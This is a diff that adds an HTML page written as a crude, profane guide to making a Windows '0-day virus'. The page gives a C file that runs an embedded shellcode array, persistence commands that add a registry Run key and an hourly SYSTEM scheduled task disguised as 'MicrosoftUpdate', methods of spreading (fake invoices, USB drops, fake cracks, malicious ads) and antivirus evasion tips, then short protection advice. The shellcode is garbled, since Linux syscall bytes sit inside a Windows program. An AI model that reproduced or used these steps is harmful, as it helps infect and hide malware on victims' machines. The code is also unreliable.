@@ -1,0 +1,113 @@
+<html>
+<head>
+<meta charset="UTF-8">
+<title>7m2k9t4.dase</title>
+<style>
+body {
+    background-color: #000000;
+    color: #ff0000;
+    font-family: "Courier New", "Lucida Console", monospace;
+    font-size: 10pt;
+    margin: 20px;
+}
+a {
+    color: #ff0000;
+    text-decoration: none;
+}
+a:hover {
+    text-decoration: underline;
+}
+hr {
+    border: 1px solid #ff0000;
+}
+</style>
+</head>
+<body>
+
+<pre>
+i fucking love you -b4l4nc3
+
+how to create a deadly 0-day virus lol
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+ok listen
+
+u want a real 0-day? here we go
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+step 1: find a bug
+
+grab windows 7 (old version no updates)
+get a fuzzer like afl or just do it manual
+crash the fucking thing and see what happens
+
+targets:
+- win32k.sys (easy)
+- ntoskrnl.exe (harder)
+- some random driver (lucky)
+
+step 2: write the exploit
+
+save this as exploit.c:
+
+---
+#include &lt;windows.h&gt;
+
+unsigned char shellcode[] = {
+    0x31,0xc0,0x50,0x68,0x63,0x6d,0x64,0x2e,
+    0x68,0x65,0x78,0x65,0x20,0x89,0xe3,0x50,
+    0x53,0x89,0xe1,0xb0,0x0b,0x99,0xcd,0x80
+};
+
+int main() {
+    // trigger the crash here idiot
+    void (*exec)() = (void(*)())shellcode;
+    exec();
+    return 0;
+}
+---
+
+compile: mingw32-gcc exploit.c -o exploit.exe
+
+step 3: make it stay
+
+registry:
+reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "C:\virus.exe"
+
+task:
+schtasks /create /tn "MicrosoftUpdate" /tr "C:\virus.exe" /sc hourly /ru "SYSTEM"
+
+step 4: spread that shit
+
+- email with fake invoice
+- usb stick in a parking lot (works every time)
+- fake crack for photoshop or some shit
+- malicious ad (if u got money)
+
+step 5: hide from av
+
+- pack it with something (upx but modified)
+- encrypt your strings
+- dont use stupid api calls that are monitored
+- test on virustotal from a vm (never from your real ip dumbass)
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+protection (if u care):
+
+- update windows u retard
+- dont open random attachments
+- use defender (its actually ok)
+- standard user account not admin
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+thats it. dont get caught
+good luck lol
+
+</pre>
+
+</body>
+</html>
